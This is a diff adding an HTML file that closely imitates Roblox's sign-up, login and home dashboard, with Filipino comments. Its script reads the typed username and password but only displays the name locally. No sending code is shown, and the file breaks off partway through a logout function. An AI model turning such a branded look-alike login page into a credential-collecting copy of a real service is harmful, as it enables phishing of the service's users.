@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox | Home</title>
+    <style>
+        :root { 
+            /* THEME VARIABLES (DEFAULT DARK THEME PARA SA DASHBOARD AT GATEWAY) */
+            --nav-bg: #232527; 
+            --body-bg: #191B1D; 
+            --text: #FFFFFF; 
+            --rbx-blue: #0084ff; 
+            --card-bg: rgba(35, 37, 39, 0.95);
+            --input-bg: #191b1d;
+            --input-border: #555555;
+            --sidebar-width: 240px;
+            --border-color: #393b3d;
+            --btn-bg: #ffffff;
+            --btn-text: #191b1d;
+            --text-muted: #b8b8b8;
+        }
+
+        /* LIGHT THEME FOR PURE HTML INTERCHANGES */
+        .theme-checkbox:checked + .app-container {
+            --nav-bg: #FFFFFF;
+            --body-bg: #F2F4F5;
+            --text: #393B3D;
+            --card-bg: #FFFFFF;
+            --sidebar-width: 240px;
+            --border-color: #DEE1E3;
+            --btn-bg: #393B3D;
+            --btn-text: #FFFFFF;
+            --text-muted: #75787B;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'HCo Gotham SSm', sans-serif; }
+        body { background-color: #191B1D; font-size: 14px; zoom: 90%; overflow-x: hidden; }
+
+        /* CONTROL ELEMENTS */
+        .theme-checkbox { display: none; }
+        .app-container { min-height: 100vh; color: var(--text); }
+
+        /* --- LOGIN / SIGNUP DARK GATE AREA --- */
+        #auth-gate { display: block; position: fixed; inset: 0; z-index: 1500; }
+        .auth-bg {
+            position: absolute; inset: 0;
+            background: linear-gradient(rgba(0,0,0,0.45), rgba(0,0,0,0.55)), url('mixcollage-18-dec-2024-03-04-am-1321.avif');
+            background-size: cover; background-position: center;
+        }
+        .auth-header {
+            position: absolute; top: 0; left: 0; width: 100%; height: 40px;
+            background: rgba(0,0,0,0.6); display: flex; align-items: center; justify-content: space-between;
+            padding: 0 30px; z-index: 1700;
+        }
+        .auth-header-links { display: flex; gap: 20px; font-size: 13px; font-weight: bold; }
+        .auth-header-links a { color: #fff; text-decoration: none; opacity: 0.8; }
+        .auth-top-btn { background: #fff; border: none; padding: 5px 20px; color: #000; font-weight: bold; border-radius: 4px; cursor: pointer; font-size: 13px; }
+
+        .auth-container { position: absolute; inset: 0; z-index: 1600; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .rbx-title { color: #ffffff; font-size: 52px; font-weight: 800; letter-spacing: 4px; margin-bottom: 20px; text-shadow: 0 4px 8px rgba(0,0,0,0.6); }
+        
+        .auth-card { background: rgba(35, 37, 39, 0.95); border-radius: 4px; border: 1px solid rgba(255,255,255,0.05); box-shadow: 0 8px 24px rgba(0,0,0,0.8); text-align: center; }
+        #signup-form { width: 440px; padding: 28px 30px; }
+        #signup-form h2 { font-size: 14px; margin-bottom: 22px; font-weight: bold; color: #fff; letter-spacing: 0.5px; }
+        #login-form { width: 380px; padding: 35px 30px 25px 30px; }
+        .login-title { font-size: 26px; font-weight: bold; color: #fff; margin-bottom: 22px; text-align: center; }
+
+        .form-group { text-align: left; margin-bottom: 12px; }
+        .form-group p { font-size: 12px; font-weight: bold; color: #fff; margin-bottom: 5px; }
+        .rbx-input { width: 100%; padding: 10px 12px; background: #191b1d; border: 1px solid #555555; border-radius: 4px; color: #fff; font-size: 14px; outline: none; }
+        
+        .birthday-row { display: flex; gap: 8px; }
+        .birthday-select { flex: 1; padding: 10px; background: #191b1d; border: 1px solid #555555; border-radius: 4px; color: #fff; font-size: 14px; cursor: pointer; }
+
+        .gender-row { display: flex; border: 1px solid #555555; border-radius: 4px; overflow: hidden; background: #191b1d; }
+        .g-btn { flex: 1; height: 38px; display: flex; align-items: center; justify-content: center; cursor: pointer; border-right: 1px solid #555555; }
+        .g-btn:last-child { border-right: none; }
+        .g-btn svg { width: 20px; height: 20px; fill: #adb1b5; }
+        .g-btn.active { background: #393b3d; }
+        .g-btn.active svg { fill: #fff; }
+
+        .terms-text { font-size: 11px; color: #bbb; line-height: 1.5; text-align: left; margin: 15px 0; }
+        .terms-text a { color: var(--rbx-blue); text-decoration: none; }
+        .auth-submit-btn { background: #fff; color: #000; width: 100%; padding: 12px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 14px; }
+        .login-gray-btn { background: transparent; border: 1px solid #fff; color: #fff; width: 100%; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 8px; font-size: 13px; }
+        .forgot-link { display: block; color: #fff; font-size: 12px; text-decoration: none; margin: 15px 0; opacity: 0.9; }
+        .switch-text { margin-top: 15px; font-size: 13px; color: #bbb; cursor: pointer; display: inline-block; }
+        .switch-text b { color: var(--rbx-blue); }
+        .device-footer { margin-top: 30px; font-size: 12px; font-weight: bold; color: #fff; letter-spacing: 0.5px; text-transform: uppercase; }
+
+        /* --- DASHBOARD STYLES (DYNAMIC COLOR CONFIGURATION) --- */
+        #main-app { display: none; background-color: var(--body-bg); min-height: 100vh; }
+
+        /* NAVBAR CONTROLS */
+        header { background: var(--nav-bg); height: 42px; display: flex; align-items: center; padding: 0 20px; position: fixed; width: 100%; z-index: 1000; border-bottom: 1px solid var(--border-color); }
+        .header-left { display: flex; align-items: center; gap: 18px; }
+        .logo { height: 20px; cursor: pointer; margin-right: 5px; }
+        
+        /* INVERTS LOGO FILTER AUTOMATICALLY FOR LIGHT/DARK MODES */
+        .theme-checkbox:not(:checked) + .app-container .logo { filter: invert(1); }
+        
+        .nav-links { display: flex; gap: 18px; }
+        .nav-links a { color: var(--text); text-decoration: none; font-size: 14px; font-weight: 500; opacity: 0.85; }
+        .nav-links a:hover { opacity: 1; }
+        
+        .search-container { flex: 1; display: flex; justify-content: flex-start; margin-left: 40px; max-width: 600px; position: relative; }
+        .search-bar { width: 100%; background: var(--body-bg); border: 1px solid var(--border-color); padding: 5px 12px 5px 35px; border-radius: 4px; color: var(--text); font-size: 13px; }
+        .search-icon-svg { position: absolute; left: 10px; top: 7px; width: 14px; height: 14px; fill: var(--text-muted); }
+
+        .header-right { display: flex; align-items: center; gap: 16px; margin-left: auto; }
+        .user-nav { display: flex; align-items: center; gap: 6px; cursor: pointer; text-decoration: none; color: var(--text); }
+        .user-nav-avatar { height: 24px; width: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: #C5CBD0; overflow: hidden; border: 1px solid var(--border-color); }
+        .user-nav-avatar img { width: 100%; height: 100%; object-fit: cover; }
+        .user-nav span { font-size: 13px; font-weight: 500; }
+        
+        .icon-btn-wrap { position: relative; cursor: pointer; display: flex; align-items: center; }
+        .icon-btn-wrap svg { width: 20px; height: 20px; fill: var(--text); }
+        .nav-badge { position: absolute; top: -5px; right: -6px; background: #000000; color: white; font-size: 9px; font-weight: bold; padding: 1px 4px; border-radius: 8px; min-width: 15px; text-align: center; }
+        
+        /* THEME CONTROLLER SWITCH TEXT */
+        .theme-toggle-label { background: var(--rbx-blue); color: #fff; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; cursor: pointer; user-select: none; }
+        .robux-counter { font-size: 13px; font-weight: bold; color: var(--text); margin-left: 4px; }
+
+        /* SIDEBAR RULES */
+        .sidebar { width: var(--sidebar-width); position: fixed; top: 42px; bottom: 0; left: 0; background: var(--nav-bg); padding: 12px 8px; border-right: 1px solid var(--border-color); overflow-y: auto; }
+        .side-item { display: flex; align-items: center; padding: 8px 12px; color: var(--text); text-decoration: none; font-size: 13px; border-radius: 4px; gap: 12px; opacity: 0.9; margin-bottom: 2px; }
+        .side-item:hover, .side-item.active { background: var(--border-color); font-weight: bold; opacity: 1; }
+        .side-item svg { width: 18px; height: 18px; fill: var(--text); opacity: 0.8; }
+        .side-profile-avatar { width: 22px; height: 22px; border-radius: 50%; background: #A0A5A8; display: flex; align-items: center; justify-content: center; overflow: hidden; border: 1px solid var(--border-color); }
+        .side-profile-avatar img { width: 100%; height: 100%; object-fit: cover; }
+        .side-count { margin-left: auto; background: var(--text); color: var(--nav-bg); font-size: 10px; font-weight: bold; padding: 1px 6px; border-radius: 10px; }
+
+        .rplus-box { background: var(--body-bg); border: 1px solid var(--border-color); padding: 12px; border-radius: 4px; margin-top: 15px; font-size: 12px; }
+        .rplus-box p { color: var(--text-muted); margin-bottom: 8px; line-height: 1.4; }
+        .rplus-box a { color: var(--text); font-weight: bold; text-decoration: none; }
+        .rplus-box a:hover { text-decoration: underline; }
+
+        /* MAIN APP REGION */
+        .main { margin-left: var(--sidebar-width); padding: 25px 40px; max-width: 1500px; }
+        .profile-greeting-zone { display: flex; align-items: center; gap: 16px; margin-bottom: 20px; }
+        .profile-greeting-avatar { width: 56px; height: 56px; border-radius: 50%; object-fit: cover; background: #C5CBD0; border: 1px solid var(--border-color); }
+        .page-main-title { font-size: 28px; font-weight: 700; color: var(--text); letter-spacing: -0.5px; }
+
+        /* VERIFICATION SYSTEM CARD BANNER */
+        .finish-banner { background: var(--card-bg); border: 1px solid var(--border-color); border-left: 4px solid var(--rbx-blue); padding: 18px 20px; border-radius: 4px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
+        .banner-content-box { display: flex; align-items: center; gap: 15px; }
+        .banner-icon-shield { width: 36px; height: 36px; border: 2px solid var(--border-color); border-radius: 8px; display: flex; align-items: center; justify-content: center; }
+        .banner-icon-shield svg { width: 20px; height: 20px; fill: var(--text-muted); }
+        .banner-text-title { font-size: 15px; font-weight: bold; color: var(--text); }
+        .banner-text-desc { font-size: 13px; color: var(--text-muted); margin-top: 2px; }
+        .banner-action-btn { background: var(--btn-bg); color: var(--btn-text); border: none; padding: 8px 16px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 13px; }
+
+        /* GRID SYSTEM SETUP */
+        .games-section { margin-top: 10px; }
+        .section-grid-title { font-size: 16px; font-weight: bold; color: var(--text); margin-bottom: 12px; }
+        .game-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; }
+        .game-card { cursor: pointer; display: flex; flex-direction: column; background: transparent; text-decoration: none; }
+        
+        .img-container-frame { width: 100%; aspect-ratio: 16/9; border-radius: 6px; overflow: hidden; border: 1px solid var(--border-color); background: #DFE1E3; }
+        .img-container-frame img { width: 100%; height: 100%; object-fit: cover; border: none; border-radius: 0; }
+        
+        .game-card-title { font-size: 13px; font-weight: bold; margin-top: 6px; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .game-card-meta { display: flex; align-items: center; gap: 4px; margin-top: 2px; font-size: 11px; color: var(--text-muted); }
+        .game-card-meta svg { width: 12px; height: 12px; fill: #00b06f; }
+
+        #logout-menu { display: none; position: fixed; top: 42px; right: 20px; background: var(--card-bg); border: 1px solid var(--border-color); width: 150px; z-index: 2000; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
+        .menu-item { padding: 10px; font-size: 12px; cursor: pointer; color: var(--text); }
+        .menu-item:hover { background: var(--border-color); }
+    </style>
+</head>
+<body>
+
+<input type="checkbox" id="theme-switch-id" class="theme-checkbox">
+
+<div class="app-container">
+
+    <div id="auth-gate">
+        <div class="auth-bg"></div>
+        <div class="auth-header">
+            <div class="auth-header-links"><a href="#">Charts</a><a href="#">Marketplace</a><a href="#">Create</a></div>
+            <button class="auth-top-btn" id="header-toggle-btn" onclick="switchForm('login')">Log In</button>
+        </div>
+        <div class="auth-container">
+            <h1 class="rbx-title">ROBLOX</h1>
+            
+            <div class="auth-card" id="signup-form">
+                <h2>SIGN UP AND START HAVING FUN!</h2>
+                <div class="form-group">
+                    <p>Birthday</p>
+                    <div class="birthday-row">
+                        <select id="su-month" class="birthday-select">
+                            <option value="" disabled selected>Month</option>
+                            <option value="January">January</option><option value="February">February</option>
+                            <option value="March">March</option><option value="April">April</option>
+                            <option value="May">May</option><option value="June">June</option>
+                            <option value="July">July</option><option value="August">August</option>
+                            <option value="September">September</option><option value="October">October</option>
+                            <option value="November">November</option><option value="December">December</option>
+                        </select>
+                        <select id="su-day" class="birthday-select"><option value="" disabled selected>Day</option></select>
+                        <select id="su-year" class="birthday-select"><option value="" disabled selected>Year</option></select>
+                    </div>
+                </div>
+                <div class="form-group"><p>Username</p><input type="text" id="su-username" class="rbx-input" placeholder="Don't use your real name"></div>
+                <div class="form-group"><p>Password</p><input type="password" id="su-password" class="rbx-input" placeholder="At least 8 characters"></div>
+                <div class="form-group">
+                    <p>Gender <span style="font-weight:normal; color:#888;">(optional)</span></p>
+                    <div class="gender-row">
+                        <div class="g-btn" onclick="selectGender(this)"><svg viewBox="0 0 24 24"><path d="M12 2c1.11 0 2 .89 2 2s-.89 2-2 2-2-.89-2-2 .89-2 2-2zm1 7h-2c-1.1 0-2 .9-2 2v5h2v6h2v6h2v-6h2v-6h2v-5c0-1.1-.9-2-2-2z"/></svg></div>
+                        <div class="g-btn" onclick="selectGender(this)"><svg viewBox="0 0 24 24"><path d="M12 2c1.11 0 2 .89 2 2s-.89 2-2 2-2-.89-2-2 .89-2 2-2zm2.5 11h-1v3.5c0 .83-.67 1.5-1.5 1.5s-1.5-.67-1.5-1.5V13h-1c-.83 0-1.5-.67-1.5-1.5v-4c0-.83.67-1.5 1.5-1.5h5c.83 0 1.5.67 1.5 1.5v4c0 .83-.67 1.5-1.5 1.5z"/></svg></div>
+                    </div>
+                </div>
+                <div class="terms-text">By clicking Sign Up, you are agreeing to our <a href="#">Terms of Use</a> and acknowledge our <a href="#">Privacy Policy</a>.</div>
+                <button class="auth-submit-btn" onclick="executeAppLogin('signup')">Sign Up</button>
+                <div class="switch-text" onclick="switchForm('login')">Already have an account? <b>Log In</b></div>
+            </div>
+            
+            <div class="auth-card" id="login-form" style="display:none;">
+                <div class="login-title">Login to Roblox</div>
+                <input type="text" id="lg-username" class="rbx-input" placeholder="Username/Email/Phone" style="margin-bottom:15px;">
+                <input type="password" id="lg-password" class="rbx-input" placeholder="Password" style="margin-bottom:20px;">
+                <button class="auth-submit-btn" onclick="executeAppLogin('login')">Log In</button>
+                <a href="#" class="forgot-link">Forgot Password or Username?</a>
+                <button class="login-gray-btn">Email Me a One-Time Code</button>
+                <button class="login-gray-btn">Quick Sign-In</button>
+                <div class="switch-text" onclick="switchForm('signup')" style="margin-top:25px;">Don't have an account? <b>Sign Up</b></div>
+            </div>
+            <div class="device-footer" id="device-footer-text">Roblox on your device</div>
+        </div>
+    </div>
+
+    <div id="main-app">
+        <header>
+            <div class="header-left">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="logo">
+                <div class="nav-links">
+                    <a href="#">Charts</a>
+                    <a href="#">Marketplace</a>
+                    <a href="#">Create</a>
+                    <a href="#">Robux</a>
+                </div>
+            </div>
+            <div class="search-container">
+                <svg class="search-icon-svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+                <input type="text" class="search-bar" placeholder="Search">
+            </div>
+            <div class="header-right">
+                <label for="theme-switch-id" class="theme-toggle-label">Switch Theme</label>
+
+                <a href="#" class="user-nav">
+                    <div class="user-nav-avatar"><img src="OIP.webp" alt="Avatar"></div>
+                    <span id="target-profile-name">User</span>
+                </a>
+                <div class="icon-btn-wrap" style="margin-left:5px;">
+                    <svg viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/></svg>
+                    <div class="nav-badge" id="notif-badge-top">1</div>
+                </div>
+                <div class="icon-btn-wrap" onclick="toggleGearMenu(event)">
+                    <svg viewBox="0 0 24 24"><path d="M19.43 12.98c.04-.32.07-.64.07-.98s-.03-.66-.07-.98l2.11-1.65c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.3-.61-.22l-2.49 1c-.52-.4-1.08-.73-1.69-.98l-.38-2.65C14.46 2.18 14.25 2 14 2h-4c-.25 0-.46.18-.49.42l-.38 2.65c-.61.25-1.17.59-1.69.98l-2.49-1c-.23-.09-.49 0-.61.22l-2 3.46c-.13.22-.07.49.12.64l2.11 1.65c-.04.32-.07.65-.07.98s.03.66.07.98l-2.11 1.65c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1c.52.4 1.08.73 1.69.98l.38 2.65c.03.24.24.42.49.42h4c.25 0 .46-.18.49-.42l.38-2.65c.61-.25 1.17-.59 1.69-.98l2.49 1c.23.09.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.65zM12 15.5c-1.93 0-3-1.07-3-3s1.07-3 3-3 3 1.07 3 3-1.07 3-3 3z"/></svg>
+                    <div class="robux-counter">0</div>
+                </div>
+            </div>
+        </header>
+
+        <div id="logout-menu">
+            <div class="menu-item" onclick="showPopup()">Log Out</div>
+        </div>
+
+        <div class="sidebar">
+            <a href="#" class="side-item">
+                <div class="side-profile-avatar"><img src="OIP.webp" alt="Avatar"></div>
+                <span id="side-profile-name">User</span>
+            </a>
+            <a href="#" class="side-item active"><svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg><span>Home</span></a>
+            <a href="#" class="side-item"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg><span>Profile</span></a>
+            <a href="#" class="side-item"><svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 10h-4v4h-2v-4H7v-2h4V7h2v4h4v2z"/></svg><span>Roblox Plus</span></a>
+            <a href="#" class="side-item"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg><span>Messages</span><span class="side-count">1</span></a>
+            <a href="#" class="side-item"><svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg><span>Friends</span></a>
+            <a href="#" class="side-item"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H7c0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.04-.42 1.99-1.07 2.75z"/></svg><span>Avatar</span></a>
+            <a href="#" class="side-item"><svg viewBox="0 0 24 24"><path d="M4 6H2v14c0 1.1.9 2 2 2h14v-2H4V6zm16-4H8c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H8V4h12v12z"/></svg><span>Inventory</span></a>
+            <a href="#" class="side-item"><svg viewBox="0 0 24 24"><path d="M16 17.01V10h-2v7.01h-3L15 21l4-3.99h-3zM9 3L5 6.99h3V14h2V6.99h3L9 3z"/></svg><span>Trade</span></a>
+            <a href="#" class="side-item"><svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg><span>Communities</span></a>
+            <a href="#" class="side-item"><svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg><span>Blog</span></a>
+            <a href="#" class="side-item"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-5 14H4v-4h11v4zm0-5H4V9h11v4zm5 5h-4V9h4v9z"/></svg><span>Official Store</span></a>
+            <a href="#" class="side-item"><svg viewBox="0 0 24 24"><path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 16H6V4h12v14z"/></svg><span>Buy Gift Cards</span></a>
+            
+            <div class="rplus-box">
+                <p>More fun for less Robux. Subscribe to Roblox Plus.</p>
+                <a href="#">Subscribe</a>
+            </div>
+        </div>
+
+        <div class="main">
+            <div class="profile-greeting-zone">
+                <img src="OIP.webp" alt="Avatar Graphic" class="profile-greeting-avatar">
+                <h1 class="page-main-title">Home</h1>
+            </div>
+
+            <div class="finish-banner">
+                <div class="banner-content-box">
+                    <div class="banner-icon-shield">
+                        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                    </div>
+                    <div>
+                        <div class="banner-text-title">Finish Account Set Up</div>
+                        <div class="banner-text-desc">Without a Contact Method, you may lose access to game progress, items, and Robux if your account is lost.</div>
+                    </div>
+                </div>
+                <button class="banner-action-btn">Add Email</button>
+            </div>
+
+            <div class="games-section">
+                <div class="section-grid-title">Recommended For You</div>
+                
+                <div class="game-grid">
+                    <div class="game-card">
+                        <div class="img-container-frame"><img src="I.webp" alt="RIVALS"></div>
+                        <p class="game-card-title">RIVALS</p>
+                        <div class="game-card-meta"><svg viewBox="0 0 24 24"><path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg><span>94% Rating</span></div>
+                    </div>
+                    
+                    <div class="game-card">
+                        <div class="img-container-frame">
+                            <img src="strongest.webp" alt="The Strongest Battlegrounds">
+                        </div>
+                        <p class="game-card-title">[TECH PRODIGY] The Strongest...</p>
+                        <div class="game-card-meta"><svg viewBox="0 0 24 24"><path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg><span>83% Rating</span></div>
+                    </div>
+                    
+                    <div class="game-card">
+                        <div class="img-container-frame">
+                            <img src="bloxfruit.webp" alt="Blox Fruits">
+                        </div>
+                        <p class="game-card-title">Blox Fruits</p>
+                        <div class="game-card-meta"><svg viewBox="0 0 24 24"><path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg><span>92% Rating</span></div>
+                    </div>
+                    
+                    <div class="game-card">
+                        <div class="img-container-frame"><img src="Brookhaven-RP-Roblox-1.jpg" alt="Brookhaven RP"></div>
+                        <p class="game-card-title">Brookhaven 🏡 RP</p>
+                        <div class="game-card-meta"><svg viewBox="0 0 24 24"><path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg><span>85% Rating</span></div>
+                    </div>
+                </div>
+                
+                <div class="game-grid" style="margin-top:16px;">
+                    <div class="game-card">
+                        <div class="img-container-frame"><img src="OIP (1).webp" alt="BRGY. TALAMPAS"></div>
+                        <p class="game-card-title">(MODIF x LIMITED UPDATE 🛍️)...</p>
+                        <div class="game-card-meta"><svg viewBox="0 0 24 24"><path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg><span>95% Rating</span></div>
+                    </div>
+                    
+                    <div class="game-card">
+                        <div class="img-container-frame">
+                            <img src="slime.webp" alt="Slime RNG">
+                        </div>
+                        <p class="game-card-title">Slime RNG</p>
+                        <div class="game-card-meta"><svg viewBox="0 0 24 24"><path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg><span>88% Rating</span></div>
+                    </div>
+                    
+                    <div class="game-card">
+                        <div class="img-container-frame"><img src="featured-mm2-promo.webp" alt="Murder Mystery 2"></div>
+                        <p class="game-card-title">Murder Mystery 2</p>
+                        <div class="game-card-meta"><svg viewBox="0 0 24 24"><path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg><span>90% Rating</span></div>
+                    </div>
+                    
+                    <div class="game-card">
+                        <div class="img-container-frame">
+                            <img src="pet.webp" alt="Pet Simulator 99">
+                        </div>
+                        <p class="game-card-title">Pet Simulator 99</p>
+                        <div class="game-card-meta"><svg viewBox="0 0 24 24"><path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg><span>92% Rating</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // System core event handler
+    window.addEventListener('DOMContentLoaded', () => {
+        const daySelect = document.getElementById('su-day');
+        const yearSelect = document.getElementById('su-year');
+        for (let d = 1; d <= 31; d++) { daySelect.add(new Option(d, d)); }
+        const currentYear = new Date().getFullYear();
+        for (let y = currentYear; y >= 1920; y--) { yearSelect.add(new Option(y, y)); }
+    });
+
+    function switchForm(type) {
+        document.getElementById('signup-form').style.display = type === 'signup' ? 'block' : 'none';
+        document.getElementById('login-form').style.display = type === 'login' ? 'block' : 'none';
+        document.getElementById('device-footer-text').style.display = type === 'signup' ? 'block' : 'none';
+        document.getElementById('header-toggle-btn').innerText = type === 'signup' ? 'Log In' : 'Sign Up';
+        document.getElementById('header-toggle-btn').setAttribute('onclick', `switchForm('${type === 'signup' ? 'login' : 'signup'}')`);
+    }
+
+    function selectGender(el) {
+        document.querySelectorAll('.g-btn').forEach(b => b.classList.remove('active'));
+        el.classList.add('active');
+    }
+
+    function executeAppLogin(type) {
+        let userField = type === 'signup' ? document.getElementById('su-username').value : document.getElementById('lg-username').value;
+        let passField = type === 'signup' ? document.getElementById('su-password').value : document.getElementById('lg-password').value;
+
+        if (userField.trim() && passField.trim()) {
+            // Apply current credentials onto active panels
+            document.getElementById('target-profile-name').innerText = userField;
+            document.getElementById('side-profile-name').innerText = userField;
+
+            // Trigger window viewport swaps
+            document.getElementById('auth-gate').style.display = 'none';
+            document.getElementById('main-app').style.display = 'block';
+        } else {
+            alert("Pakisulat muna pre ang iyong Username at Password!");
+        }
+    }
+
+    // Toggle menu para sa gear icon at profile settings
+    function toggleGearMenu(event) {
+        event.stopPropagation();
+        const logoutMenu = document.getElementById('logout-menu');
+        logoutMenu.style.display = logoutMenu.style.display === 'block' ? 'none' : 'block';
+    }
+
+    // System Log Out Routine
+    function showPopup() {
